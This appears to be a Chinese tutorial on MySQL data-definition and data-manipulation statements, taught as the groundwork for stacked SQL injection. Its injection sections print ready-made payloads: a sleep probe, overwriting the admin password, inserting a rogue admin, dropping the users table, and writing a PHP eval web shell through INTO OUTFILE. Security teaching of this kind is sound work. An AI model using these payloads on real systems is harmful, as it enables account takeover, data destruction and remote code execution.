## 一句话概括

注入里常用的 `SELECT` 只是 SQL 的一小半。当注入点支持**堆叠注入**（用 `;` 一次提交多条语句）时，`INSERT` / `UPDATE` / `DELETE` / `CREATE TABLE` 都能被当成攻击载荷——这些增删改语句就是它们的语法基础。

## 原理

### 1. 为什么注入要懂增删改

- 普通注入只能**读**数据（`SELECT`）；
- 一旦后端接口支持多语句，就能**写**数据：改管理员密码、插入新用户、删表；
- 配合 `SELECT ... INTO OUTFILE`，还能直接写 WebShell 文件。

### 2. 堆叠注入是什么

用分号把多条 SQL 语句串起来：

```sql
1'; update users set password='hacked' where username='admin'--+
```

拼接进原 SQL 后变成：

```sql
select ... from users where id = '1'; update users set password='hacked' where username='admin'--' limit 1;
```

第一条语句照常结束，`;` 之后是**一条全新的语句**，它同样会被数据库执行。

### 3. 堆叠注入的前提

| 前提 | 说明 |
|---|---|
| 接口支持多语句 | PHP 里 `mysqli_query()` **只执行第一条**，必须用 `mysqli_multi_query()`；PDO 默认也禁用多语句 |
| 注入点能闭合 + 注释 | 和普通注入一样，要先闭合再注释掉残留部分 |
| 数据库用户有对应权限 | 执行 `UPDATE`、`CREATE` 等需要相应权限 |

> 关键：**`;` 不是万能的**。绝大多数环境用单语句接口，`;` 后面写再多也不会执行。判断能不能堆叠，最直接的办法是发一条 `1'; select sleep(3)--+`，看有没有延迟。

## 库操作（DDL）

```sql
-- 1. 登录 MySQL
--    在命令行执行：mysql -u root -p  （回车后输入密码）
-- 2. 查看所有数据库
show databases;
-- 3. 创建数据库（指定 utf8 字符集）
CREATE DATABASE employees CHARACTER SET utf8;
-- 4. 删除数据库
drop database employees;
-- 5. 选择（切换）数据库
USE employees;
```

## 表操作（DDL）

### 创建表

```sql
CREATE TABLE 表名 (
    列名1 数据类型 [约束条件],
    列名2 数据类型 [约束条件],
    列名3 数据类型 [约束条件],
    ...
    [表级约束条件]
);
```

示例：

```sql
CREATE TABLE employee (
    id       int,
    name     varchar(18),
    sex      char(4),
    birthday date
);
```

各列解析：

| 列定义 | 含义 |
|---|---|
| `id int` | 整数列，可存 `1`、`100`、`-5` |
| `name varchar(18)` | 可变长字符串，最多 18 个字符，如 `"张三"`、`"John Smith"` |
| `sex char(4)` | 定长字符串，始终占 4 个字符，如 `"男"`、`"女"` |
| `birthday date` | 日期，如 `"1990-05-15"` |

### 查看与修改表结构

```sql
-- 查看数据表结构
SHOW FULL COLUMNS FROM employee;
-- 查看数据表数据
SELECT * FROM employee;
-- 删除数据表
DROP TABLE employee;
-- 修改表名
RENAME TABLE employee TO user;
-- 修改表字符集
alter table user character set utf8;
```

## 列操作（DDL）

```sql
-- 增加一列
alter table user add salary decimal(8,2);
-- 删除一列
alter table user drop name;
```

`DECIMAL(8,2)` 的 `(8,2)` 表示**精度和小数位数**：

- 格式：`DECIMAL(M, D)`
- `M` = 总位数（精度），`D` = 小数位数
- `DECIMAL(8,2)` → 共 8 位，其中 2 位是小数 → 整数部分 6 位

## 行操作（DML）

### 插入数据

```sql
INSERT INTO 表名 (
    字段1, 字段2, 字段3, ...
) VALUES (
    值1, 值2, 值3, ...
);
```

示例（字符串要加单引号）：

```sql
INSERT INTO user (
    id, name, sex, birthday
) VALUES (
    1, 'ctfstu', 'male', '1999-05-06'
);
```

### 修改数据

```sql
-- 修改所有行的 salary
update user set salary=5000;

-- 只改指定行
update user set name='QIU' where id=1;

-- 一次改多列
update user set name='QIU', salary=20000 where id=1;
```

### 删除数据

```sql
-- 删除符合条件的行
delete from user where name='QIU';

-- 删除表中所有行（表结构仍在）
delete from user;
```

## 在注入中的用法（堆叠注入示例）

```sql
-- 探测是否支持多语句
1'; select sleep(3)--+

-- 改掉管理员密码
1'; update users set password='123456' where username='admin'--+

-- 插入一个新管理员
1'; insert into users(username,password) values('hacker','p@ss')--+

-- 删表（破坏性，慎用）
1'; drop table users--+

-- 写一句话木马（需 FILE 权限 + Web 目录可写）
1' union select 1,'<?php eval($_POST[1]);?>' into outfile '/var/www/html/shell.php'--+
```

## 踩坑与备注

- **`mysqli_query()` 不支持多语句**：它只执行分号前的第一条，堆叠注入在这类接口上无效，必须换回 `UNION`/盲注。
- **`DELETE FROM user;` 是清空数据、保留表结构**；`DROP TABLE user;` 才是连表一起删。两者破坏力不同，实战演示时务必确认。
- **`UPDATE`/`DELETE` 不带 `WHERE` 会影响全表**（如 `update user set salary=5000;` 把所有人的工资都改了）——这是语法特性，也是注入里最容易造成破坏的点。
- **原文的 `update ... set name='QIU' ，salary=...` 里是全角逗号**，这里已修正为半角 `,`；写 SQL 时全角标点一定会报语法错误。
- **堆叠注入常配合 `INTO OUTFILE` 写文件**，但写文件需要 `FILE` 权限，且目标目录要对 MySQL 用户可写。
